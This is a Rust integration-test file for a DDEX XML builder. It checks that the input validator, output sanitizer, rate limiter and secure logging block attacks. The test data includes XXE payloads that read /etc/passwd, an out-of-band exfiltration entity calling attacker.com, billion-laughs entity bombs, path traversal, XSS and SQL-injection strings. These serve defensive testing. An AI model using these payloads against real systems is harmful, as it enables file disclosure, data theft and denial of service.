//! Security Integration Tests
//!
//! This module contains end-to-end integration tests that verify security measures
//! work correctly across the entire DDEX Builder pipeline.

use super::*;
use ddex_builder::{
    builder::DDEXBuilder,
    error::BuildError,
    security::{InputValidator, SecurityConfig, SecureXmlReader, OutputSanitizer, RateLimiter},
};
use serde_json::json;
use std::io::Cursor;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

/// Test complete XXE prevention pipeline
#[test]
fn test_complete_xxe_prevention_pipeline() {
    // Test all XXE payloads through the complete pipeline
    let xxe_payloads = generate_xxe_payloads();
    
    for (description, payload) in xxe_payloads {
        assert_xxe_blocked(&payload, description);
    }
    
    // Verify valid XML still works
    let valid_payloads = generate_valid_xml_payloads();
    
    for (description, payload) in valid_payloads {
        assert_valid_xml_allowed(&payload, description);
    }
}

/// Test security configuration variations
#[test]
fn test_security_config_variations() {
    // Test with restrictive config
    let restrictive = restrictive_security_config();
    let validator = InputValidator::new(restrictive);
    
    // Even small suspicious content should be blocked
    let small_xxe = r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>"#;
    assert!(validator.validate_xml_content(small_xxe).is_err());
    
    // Large valid content should be blocked by size limits
    let large_valid = format!("<root>{}</root>", "A".repeat(20_000));
    assert!(validator.validate_xml_content(&large_valid).is_err());
    
    // Test with permissive config
    let permissive = permissive_security_config();
    let validator = InputValidator::new(permissive);
    
    // Large valid content should now be allowed
    let large_valid = format!("<root>{}</root>", "A".repeat(50_000));
    assert!(validator.validate_xml_content(&large_valid).is_ok());
    
    // But XXE should still be blocked
    assert!(validator.validate_xml_content(small_xxe).is_err());
}

/// Test security under concurrent load
#[test]
fn test_concurrent_security() {
    let config = test_security_config();
    let config = Arc::new(config);
    
    let handles: Vec<_> = (0..10)
        .map(|thread_id| {
            let config = Arc::clone(&config);
            thread::spawn(move || {
                let validator = InputValidator::new((*config).clone());
                
                // Each thread tries various XXE attacks
                let attacks = vec![
                    r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"#,
                    r#"<!DOCTYPE test [<!ENTITY % file SYSTEM "file:///etc/hosts">%file;]><test/>"#,
                    r#"<!DOCTYPE bomb [<!ENTITY a "aa"><!ENTITY b "&a;&a;&a;&a;">]><bomb>&b;</bomb>"#,
                ];
                
                for (i, attack) in attacks.iter().enumerate() {
                    let result = validator.validate_xml_content(attack);
                    assert!(
                        result.is_err(),
                        "Thread {} attack {} should be blocked: {:?}",
                        thread_id, i, result
                    );
                }
                
                // Also test valid XML
                let valid = "<root><child>content</child></root>";
                assert!(
                    validator.validate_xml_content(valid).is_ok(),
                    "Thread {} valid XML should be allowed",
                    thread_id
                );
            })
        })
        .collect();
    
    // Wait for all threads to complete
    for handle in handles {
        handle.join().expect("Thread should complete successfully");
    }
}

/// Test rate limiting functionality
#[test]
fn test_rate_limiting_integration() {
    let config = SecurityConfig {
        rate_limiting_enabled: true,
        max_requests_per_minute: 5, // Very low limit for testing
        ..SecurityConfig::default()
    };
    
    let mut limiter = RateLimiter::new(config);
    let identifier = "test_user";
    
    // First 5 requests should succeed
    for i in 0..5 {
        let result = limiter.check_rate_limit(identifier);
        assert!(
            result.is_ok(),
            "Request {} should be allowed: {:?}",
            i + 1, result
        );
    }
    
    // 6th request should fail
    let result = limiter.check_rate_limit(identifier);
    assert!(
        result.is_err(),
        "6th request should be rate limited: {:?}",
        result
    );
    
    // Different user should still work
    let result = limiter.check_rate_limit("different_user");
    assert!(result.is_ok(), "Different user should not be rate limited");
}

/// Test output sanitization pipeline
#[test]
fn test_output_sanitization_pipeline() {
    let config = SecurityConfig::default();
    let sanitizer = OutputSanitizer::new(config);
    
    // Test various potentially dangerous outputs
    let dangerous_outputs = vec![
        (
            "Script in XML",
            r#"<root><script>alert('XSS')</script></root>"#
        ),
        (
            "Sensitive data pattern",
            r#"<root><password>secret123</password></root>"#
        ),
        (
            "Malformed XML",
            r#"<root><unclosed>"#
        ),
        (
            "Excessive nesting",
            &format!("<root>{}</root>", 
                (0..200).map(|i| format!("<level{}>", i)).collect::<String>() +
                "content" +
                &(0..200).rev().map(|i| format!("</level{}>", i)).collect::<String>()
            )
        ),
    ];
    
    for (description, output) in dangerous_outputs {
        let result = sanitizer.sanitize_xml_output(output);
        assert!(
            result.is_err(),
            "{} should be rejected by output sanitizer: {:?}",
            description, result
        );
    }
    
    // Test safe outputs
    let safe_outputs = vec![
        (
            "Simple valid XML",
            r#"<root><child>safe content</child></root>"#
        ),
        (
            "XML with escaped entities",
            r#"<root>&lt;content&gt; &amp; &quot;quotes&quot;</root>"#
        ),
        (
            "DDEX structure",
            r#"<ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43"><ddex:MessageHeader><ddex:MessageId>MSG123</ddex:MessageId></ddex:MessageHeader></ddex:NewReleaseMessage>"#
        ),
    ];
    
    for (description, output) in safe_outputs {
        let result = sanitizer.sanitize_xml_output(output);
        assert!(
            result.is_ok(),
            "{} should be allowed by output sanitizer: {:?}",
            description, result
        );
    }
}

/// Test error handling and information disclosure prevention
#[test]
fn test_secure_error_handling() {
    let config = test_security_config();
    let validator = InputValidator::new(config);
    
    // Test that error messages don't leak sensitive information
    let xxe_attack = r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"#;
    
    match validator.validate_xml_content(xxe_attack) {
        Err(BuildError::Security(msg)) => {
            // Error message should not contain file paths or system information
            assert!(!msg.contains("/etc/passwd"));
            assert!(!msg.contains("file://"));
            assert!(!msg.contains("system"));
            
            // Should contain generic security message
            assert!(msg.to_lowercase().contains("dtd") || 
                   msg.to_lowercase().contains("entity") ||
                   msg.to_lowercase().contains("external") ||
                   msg.to_lowercase().contains("dangerous"));
        }
        other => panic!("Expected security error, got: {:?}", other),
    }
    
    // Test path traversal error messages
    match validator.validate_path("../../../etc/passwd") {
        Err(BuildError::InputSanitization(msg)) => {
            // Should not reveal actual file system structure
            assert!(!msg.contains("/etc/passwd"));
            assert!(msg.to_lowercase().contains("path") || msg.to_lowercase().contains("traversal"));
        }
        other => panic!("Expected input sanitization error, got: {:?}", other),
    }
}

/// Test memory safety under attack conditions
#[test]
fn test_memory_safety_under_attack() {
    let config = SecurityConfig {
        max_xml_size: 100_000, // 100KB limit
        max_xml_depth: 50,
        max_child_elements: 1000,
        ..SecurityConfig::default()
    };
    
    let validator = InputValidator::new(config.clone());
    
    // Test large XML attack
    let large_xml = format!("<root>{}</root>", "A".repeat(200_000));
    let result = validator.validate_xml_content(&large_xml);
    assert!(result.is_err(), "Large XML should be rejected");
    
    // Test deep nesting attack  
    let mut deep_xml = String::from("<root>");
    for i in 0..100 {
        deep_xml.push_str(&format!("<level{}>", i));
    }
    deep_xml.push_str("content");
    for i in (0..100).rev() {
        deep_xml.push_str(&format!("</level{}>", i));
    }
    deep_xml.push_str("</root>");
    
    let result = validator.validate_xml_content(&deep_xml);
    assert!(result.is_err(), "Deep XML should be rejected");
    
    // Test with SecureXmlReader
    let cursor = Cursor::new(deep_xml.as_bytes());
    let mut reader = SecureXmlReader::new(cursor, config);
    
    let mut buf = Vec::new();
    let mut events_processed = 0;
    
    loop {
        if events_processed > 1000 {
            panic!("Too many events processed, depth limit not working");
        }
        
        match reader.read_event(&mut buf) {
            Ok(quick_xml::events::Event::Eof) => break,
            Ok(_) => {
                events_processed += 1;
                buf.clear();
            }
            Err(BuildError::Security(_)) => {
                // Expected - depth limit reached
                return;
            }
            Err(e) => panic!("Unexpected error: {:?}", e),
        }
    }
}

/// Test performance degradation under attack
#[test]
fn test_performance_under_attack() {
    use std::time::Instant;
    
    let config = test_security_config();
    let validator = InputValidator::new(config);
    
    // Measure baseline performance with valid XML
    let valid_xml = r#"<root><child>normal content</child></root>"#;
    let start = Instant::now();
    
    for _ in 0..100 {
        let _ = validator.validate_xml_content(valid_xml);
    }
    
    let baseline_duration = start.elapsed();
    
    // Test performance with XXE attacks
    let xxe_attack = r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"#;
    let start = Instant::now();
    
    for _ in 0..100 {
        let _ = validator.validate_xml_content(xxe_attack);
    }
    
    let attack_duration = start.elapsed();
    
    // Attack processing should not be dramatically slower than normal processing
    // This ensures that the security measures don't create a DoS vulnerability
    assert!(
        attack_duration < baseline_duration * 10,
        "Attack processing too slow: {:?} vs baseline {:?}",
        attack_duration, baseline_duration
    );
}

/// Test security logging without information disclosure
#[test] 
fn test_secure_logging() {
    let config = SecurityConfig::default();
    let sanitizer = OutputSanitizer::new(config);
    
    // Test that sensitive data in errors gets properly redacted in logs
    let sensitive_operations = vec![
        ("BUILD", "file:///etc/passwd"),
        ("PARSE", "http://attacker.com/steal?data=secret"),
        ("VALIDATE", "password=admin123 token=abc"),
        ("PROCESS", "api_key=xyz789 secret=topsecret"),
    ];
    
    for (operation, sensitive_detail) in sensitive_operations {
        let log_msg = sanitizer.create_secure_log_message(operation, false, Some(sensitive_detail));
        
        // Should not contain sensitive data
        assert!(!log_msg.contains("passwd"));
        assert!(!log_msg.contains("admin123"));
        assert!(!log_msg.contains("abc"));
        assert!(!log_msg.contains("xyz789"));
        assert!(!log_msg.contains("topsecret"));
        assert!(!log_msg.contains("attacker.com"));
        
        // Should contain operation and status
        assert!(log_msg.contains(operation));
        assert!(log_msg.contains("FAILED"));
        
        // Should contain redaction markers
        if log_msg.contains("REDACTED") {
            // Good - sensitive data was redacted
        } else {
            // Also acceptable if sensitive details are completely omitted
            assert!(!log_msg.contains("="), "Log should not contain key=value pairs with sensitive data");
        }
    }
}

/// Test configuration validation
#[test]
fn test_security_config_validation() {
    // Test that security config enforces reasonable limits
    let configs_to_test = vec![
        SecurityConfig {
            max_xml_size: 0, // Invalid
            ..SecurityConfig::default()
        },
        SecurityConfig {
            max_xml_depth: 0, // Invalid
            ..SecurityConfig::default()
        },
        SecurityConfig {
            max_requests_per_minute: 0, // Invalid
            rate_limiting_enabled: true,
            ..SecurityConfig::default()
        },
    ];
    
    for config in configs_to_test {
        // These invalid configs should either be rejected or auto-corrected
        let validator = InputValidator::new(config);
        
        // Try to validate something - should not crash
        let result = validator.validate_string("test", "test_field");
        // Either succeeds with corrected config or fails safely
        match result {
            Ok(_) => {}, // Config was auto-corrected
            Err(_) => {}, // Config was rejected
        }
    }
}

/// Test recovery after security incidents
#[test]
fn test_security_incident_recovery() {
    let config = SecurityConfig::default();
    let validator = InputValidator::new(config);
    
    // Simulate multiple attack attempts
    let attacks = vec![
        r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"#,
        r#"<!DOCTYPE bomb [<!ENTITY a "aa"><!ENTITY b "&a;&a;&a;&a;">]><bomb>&b;</bomb>"#,
        r#"<root><script>alert('XSS')</script></root>"#,
        "'; DROP TABLE users; --",
    ];
    
    // All attacks should be blocked
    for attack in &attacks {
        let result = if attack.starts_with('<') {
            validator.validate_xml_content(attack)
        } else {
            validator.validate_string(attack, "test_field")
        };
        
        assert!(result.is_err(), "Attack should be blocked: {}", attack);
    }
    
    // After attacks, normal operation should still work
    let valid_xml = r#"<root><child>normal content</child></root>"#;
    let result = validator.validate_xml_content(valid_xml);
    assert!(result.is_ok(), "Valid content should work after attacks: {:?}", result);
    
    let valid_string = "Normal string content";
    let result = validator.validate_string(valid_string, "normal_field");
    assert!(result.is_ok(), "Valid string should work after attacks: {:?}", result);
}

/// Test comprehensive attack simulation
#[test]
fn test_comprehensive_attack_simulation() {
    let config = test_security_config();
    
    // Simulate a comprehensive attack campaign
    let attack_vectors = vec![
        // XXE attacks
        ("XXE File", r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"#),
        ("XXE HTTP", r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://attacker.com/evil.xml">]><root>&xxe;</root>"#),
        
        // Entity expansion attacks  
        ("Billion Laughs", r#"<!DOCTYPE bomb [<!ENTITY a "aa"><!ENTITY b "&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;">]><bomb>&c;</bomb>"#),
        ("Quadratic Blowup", &format!("<!DOCTYPE bomb [<!ENTITY big \"{}\">]><bomb>{}</bomb>", "A".repeat(1000), "&big;".repeat(100))),
        
        // Parameter entity attacks
        ("Param Entity", r#"<!DOCTYPE test [<!ENTITY % file SYSTEM "file:///etc/passwd">%file;]><test/>"#),
        ("OOB Exfil", r#"<!DOCTYPE test [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?%file;'>">%eval;%send;]><test/>"#),
    ];
    
    // Test each attack vector
    for (name, attack) in attack_vectors {
        assert_xxe_blocked(attack, name);
    }
    
    // Test that the system still functions normally after the attack campaign
    let normal_operations = vec![
        ("Valid XML", r#"<root><child>content</child></root>"#),
        ("DDEX XML", r#"<ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43"><ddex:MessageHeader><ddex:MessageId>MSG123</ddex:MessageId></ddex:MessageHeader></ddex:NewReleaseMessage>"#),
        ("XML with attributes", r#"<root id="123"><child attr="value">content</child></root>"#),
    ];
    
    for (name, xml) in normal_operations {
        assert_valid_xml_allowed(xml, name);
    }
}

/// Test edge cases and boundary conditions
#[test]
fn test_security_edge_cases() {
    let config = test_security_config();
    let validator = InputValidator::new(config);
    
    // Test empty inputs
    assert!(validator.validate_xml_content("").is_err());
    assert!(validator.validate_string("", "empty").is_ok()); // Empty string might be valid
    
    // Test single character inputs
    assert!(validator.validate_xml_content("a").is_err()); // Invalid XML
    assert!(validator.validate_string("a", "single").is_ok());
    
    // Test whitespace-only inputs
    assert!(validator.validate_xml_content("   ").is_err()); // Invalid XML
    assert!(validator.validate_string("   ", "whitespace").is_ok());
    
    // Test inputs at size boundaries
    let at_limit = "A".repeat(config.max_string_size);
    let over_limit = "A".repeat(config.max_string_size + 1);
    
    assert!(validator.validate_string(&at_limit, "at_limit").is_ok());
    assert!(validator.validate_string(&over_limit, "over_limit").is_err());
    
    // Test special Unicode characters
    let unicode_tests = vec![
        ("\u{0000}", "null_byte", false), // Should be rejected
        ("\u{FEFF}", "bom", true),        // BOM might be allowed
        ("\u{200B}", "zero_width_space", true), // Zero-width space might be allowed
        ("🎵", "emoji", true),            // Emoji should be allowed
    ];
    
    for (input, description, should_pass) in unicode_tests {
        let result = validator.validate_string(input, description);
        if should_pass {
            assert!(result.is_ok(), "{} should be allowed: {:?}", description, result);
        } else {
            assert!(result.is_err(), "{} should be rejected: {:?}", description, result);
        }
    }
}